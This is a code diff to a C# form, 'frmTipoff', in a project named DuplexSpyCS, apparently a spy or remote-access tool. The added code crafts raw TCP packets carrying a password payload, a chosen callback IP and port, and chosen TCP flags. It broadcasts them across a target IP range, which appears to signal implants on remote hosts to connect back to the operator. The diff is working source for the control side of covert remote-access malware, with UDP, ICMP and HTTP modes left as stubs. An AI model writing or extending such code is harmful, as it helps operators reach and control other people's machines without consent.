@@ -18,12 +18,188 @@ namespace DuplexSpyCS
 {
     public partial class frmTipoff : Form
     {
+        private enum RequestMode
+        {
+            Single,
+            Multiple,
+            LAN,
+        }
+        private enum RequestProtocol
+        {
+            TCP,
+            UDP,
+            ICMP,
+            HTTP,
+        }
+        private enum HttpAction
+        {
+            GET,
+            POST,
+            HEAD,
+            PUT,
+        }
+
         public List<ILiveDevice> m_lsDevice;
         public List<NetworkInterface> m_lsNetworkInterface;
 
         public frmTipoff()
         {
             InitializeComponent();
+        }
+
+        private RequestMode fnGetRequestMode() => (RequestMode)Enum.Parse(typeof(RequestMode), comboBox2.Text);
+        private RequestProtocol fnGetRequestProtocol() => (RequestProtocol)Enum.Parse(typeof(RequestProtocol), comboBox1.Text);
+
+        private TcpPacket fnBuildTcpPacket
+        (
+            int nPortCallback,
+            int nDestPort,
+            bool bSYN,
+            bool bACK,
+            bool bFIN,
+            bool bPUSH,
+            bool bRST,
+            bool bURG,
+
+            string szPassword
+        )
+        {
+            TcpPacket pktTCP = new TcpPacket((ushort)nPortCallback, (ushort)nDestPort);
+            pktTCP.Synchronize = bSYN;
+            pktTCP.Acknowledgment = bACK;
+            pktTCP.Finished = bFIN;
+            pktTCP.Push = bPUSH;
+            pktTCP.Reset = bRST;
+            pktTCP.Urgent = bURG;
+
+            pktTCP.PayloadData = Encoding.UTF8.GetBytes(szPassword);
+
+            return pktTCP;
+        }
+        private UdpPacket fnBuildUdpPacket
+        (
+            int nPortCallback,
+            int nDestPort,
+
+            string szPassword
+        )
+        {
+            UdpPacket pktUDP = new UdpPacket((ushort)nPortCallback, (ushort)nDestPort);
+            pktUDP.PayloadData = Encoding.UTF8.GetBytes(szPassword);
+
+            return pktUDP;
+        }
+        private IcmpV4Packet fnBuildIcmpPacket
+        (
+
+        )
+        {
+            //IcmpV4Packet pktICMP = new IcmpV4Packet()
+
+            return null;
+        }
+        private TcpPacket fnBuildHttpPacket
+        (
+            
+        )
+        {
+            return null;
+        }
+
+        private void fnTipoffRequest()
+        {
+            string szPassword = textBox11.Text;
+            int nPortCallback = (int)numericUpDown2.Value;
+
+            bool bRandomDestPort = checkBox7.Checked;
+            int nDestPort = bRandomDestPort ? new Random().Next(0, 65535) : (int)numericUpDown1.Value;
+
+            //TCP flags
+            bool bSYN = checkBox1.Checked;
+            bool bACK = checkBox2.Checked;
+            bool bFIN = checkBox3.Checked;
+            bool bPUSH = checkBox5.Checked;
+            bool bRST = checkBox4.Checked;
+            bool bURG = checkBox6.Checked;
+
+            IPAddress ipCallback = IPAddress.Parse(textBox1.Text);
+            IPAddress ipStartTarget = IPAddress.Parse(textBox2.Text);
+            IPAddress ipEndTarget = IPAddress.Parse(textBox3.Text);
+
+            byte[] abIpStart = ipStartTarget.GetAddressBytes();
+            byte[] abIpEnd = ipEndTarget.GetAddressBytes();
+
+            Array.Reverse(abIpStart);
+            Array.Reverse(abIpEnd);
+
+            uint uiIpStart = BitConverter.ToUInt32(abIpStart, 0);
+            uint uiIpEnd = BitConverter.ToUInt32(abIpEnd, 0);
+
+            Packet pkt = null;
+            switch (fnGetRequestProtocol())
+            {
+                case RequestProtocol.TCP:
+                    pkt = fnBuildTcpPacket(
+                            nPortCallback,
+                            nDestPort,
+                            bSYN,
+                            bACK,
+                            bFIN,
+                            bPUSH,
+                            bRST,
+                            bURG,
+
+                            szPassword
+                        );
+                    break;
+                case RequestProtocol.UDP:
+
+                    break;
+                default:
+                    if (pkt == null)
+                    {
+                        MessageBox.Show("Unknown RequestProtocol", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        return;
+                    }
+
+                    break;
+            }
+
+            new Thread(() =>
+            {
+                for (int i = 0; i < m_lsDevice.Count; i++)
+                {
+                    for (uint j = uiIpStart; j <= uiIpEnd; j++)
+                    {
+                        try
+                        {
+                            var device = m_lsDevice[i];
+                            var x = GetDeviceIPv4Address(device);
+                            string szIPv4Addr = x.szIPv4Addr;
+                            if (string.IsNullOrEmpty(szIPv4Addr))
+                                continue;
+
+                            byte[] abTargetIP = BitConverter.GetBytes(j);
+                            Array.Reverse(abTargetIP);
+                            IPAddress ipTarget = new IPAddress(abTargetIP);
+
+                            IPv4Packet pktIPv4 = new IPv4Packet(ipCallback, ipTarget);
+                            pktIPv4.PayloadPacket = pkt;
+
+                            EthernetPacket pktEth = new EthernetPacket(device.MacAddress, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.IPv4);
+                            pktEth.PayloadPacket = pktIPv4;
+
+                            device.Open();
+                            device.SendPacket(pktEth);
+                            device.Close();
+                        }
+                        catch (Exception ex)
+                        {
+                            //MessageBox.Show(ex.Message);
+                        }
+                    }
+                }
+            }).Start();
         }
 
         private (string szIPv4Addr, NetworkInterface netif, IPAddress mask, IPAddress gate) GetDeviceIPv4Address(ILiveDevice device)
@@ -64,47 +240,96 @@ namespace DuplexSpyCS
             return (szIPv4Addr, netIf, maskAddr, gatewayAddr);
         }
 
-        private void frmTipoff_Load(object sender, EventArgs e)
+        void fnSetup()
         {
+            //Controls
+            //Mode
+            foreach (string opt in Enum.GetNames(typeof(RequestMode)))
+                comboBox2.Items.Add(opt);
+            //Protocol
+            foreach (string opt in Enum.GetNames(typeof(RequestProtocol)))
+                comboBox1.Items.Add(opt);
+
+            comboBox1.SelectedIndex = 0;
+            comboBox2.SelectedIndex = 0;
+
+            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
+            comboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
+
+            //Load interface
             m_lsDevice = CaptureDeviceList.Instance.ToList();
             m_lsNetworkInterface = NetworkInterface.GetAllNetworkInterfaces().ToList();
         }
 
+        private void frmTipoff_Load(object sender, EventArgs e)
+        {
+            fnSetup();
+        }
+
         private void button1_Click(object sender, EventArgs e)
         {
-            TcpPacket pktTCP = new TcpPacket(5000, 5000);
-            pktTCP.Synchronize = true;
-            pktTCP.PayloadData = Encoding.UTF8.GetBytes("123456");
-            pktTCP.SequenceNumber = 5000;
+            fnTipoffRequest();
+        }
 
-            new Thread(() =>
+        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            RequestProtocol reqProto = (RequestProtocol)Enum.Parse(typeof(RequestProtocol), comboBox1.Text);
+            switch (reqProto)
             {
-                for (int i = 0; i < m_lsDevice.Count; i++)
-                {
-                    try
-                    {
-                        var device = m_lsDevice[i];
-                        var x = GetDeviceIPv4Address(device);
-                        string szIPv4Addr = x.szIPv4Addr;
-                        if (string.IsNullOrEmpty(szIPv4Addr))
-                            continue;
+                case RequestProtocol.TCP:
+                    groupBox3.Enabled = true;
+                    groupBox4.Enabled = false;
+                    groupBox5.Enabled = false;
+                    break;
+                case RequestProtocol.UDP:
+                    groupBox3.Enabled = false;
+                    groupBox4.Enabled = false;
+                    groupBox5.Enabled = false;
+                    break;
+                case RequestProtocol.ICMP:
+                    groupBox3.Enabled = false;
+                    groupBox4.Enabled = true;
+                    groupBox5.Enabled = false;
+                    break;
+                case RequestProtocol.HTTP:
+                    groupBox3.Enabled = false;
+                    groupBox4.Enabled = false;
+                    groupBox5.Enabled = true;
+                    break;
+            }
+        }
 
-                        IPv4Packet pktIPv4 = new IPv4Packet(IPAddress.Parse("192.168.1.103"), IPAddress.Parse("192.168.1.103"));
-                        pktIPv4.PayloadPacket = pktTCP;
+        private void groupBox6_Enter(object sender, EventArgs e)
+        {
 
-                        EthernetPacket pktEth = new EthernetPacket(device.MacAddress, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.IPv4);
-                        pktEth.PayloadPacket = pktIPv4;
+        }
 
-                        device.Open();
-                        device.SendPacket(pktEth);
-                        device.Close();
-                    }
-                    catch (Exception ex)
-                    {
-                        //MessageBox.Show(ex.Message);
-                    }
-                }
-            }).Start();
+        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            RequestMode reqMode = (RequestMode)Enum.Parse(typeof(RequestMode), comboBox2.Text);
+            switch (reqMode)
+            {
+                case RequestMode.Single:
+                    textBox2.Enabled = true;
+                    textBox3.Enabled = false;
+                    textBox10.Enabled = false;
+                    break;
+                case RequestMode.Multiple:
+                    textBox2.Enabled = true;
+                    textBox3.Enabled = true;
+                    textBox10.Enabled = false;
+                    break;
+                case RequestMode.LAN:
+                    textBox2.Enabled = false;
+                    textBox3.Enabled = false;
+                    textBox10.Enabled = true;
+                    break;
+            }
+        }
+
+        private void textBox2_TextChanged(object sender, EventArgs e)
+        {
+            textBox3.Text = textBox2.Text;
         }
     }
 }
